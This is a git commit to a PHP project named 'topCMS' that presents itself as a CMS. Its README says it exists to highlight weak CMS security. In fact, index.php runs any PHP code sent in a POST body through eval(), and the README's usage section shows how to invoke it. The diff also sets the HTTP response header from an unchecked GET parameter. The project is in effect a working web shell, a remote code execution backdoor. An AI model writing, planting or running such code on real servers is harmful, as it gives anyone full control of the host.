c5dd34bdaf99cdfab9c7b64a4a42056db0008ce9
Caimingjian <ilovecaimingjian@126.com>
2022-05-19 02:02:44 +0800

    添加文档，请求方式修改为POST

---
+++ README.md
@@ -0,0 +1,11 @@
+# topCMS
+顶级CMS
+## 注意事项
+该项目旨在提醒现在CMS的安全性堪忧，直接使用该项目请注意服务器安全。
+
+## 用法
+POST DOMAIN/index.php?response_content_type=Content-Type:text/html
+BODY Text ``echo phpinfo();``
+## License
+
+MIT
--- index.php
+++ index.php
@@ -2,10 +2,24 @@
 
 class index
 {
-    public function index(){
-        return eval($_GET['query']);
+    protected array $query = [];
+    protected string $code = '';
+    public string $response_content_type = 'Content-Type:text/json';
+    public function __construct()
+    {
+        if ($_GET['response_content_type'] ?? 0){
+            $this->response_content_type = $_GET['response_content_type'];
+        }
+        //POST RAW
+        if ($this->code == ''){
+            $this->code = file_get_contents("php://input");
+        }
+    }
+
+    public function handle(){
+        return eval($this->code);
     }
 }
 $index = new index();
-header('Content-Type:text/html');
-$index->index();
+$index->handle();
+header($index->response_content_type);
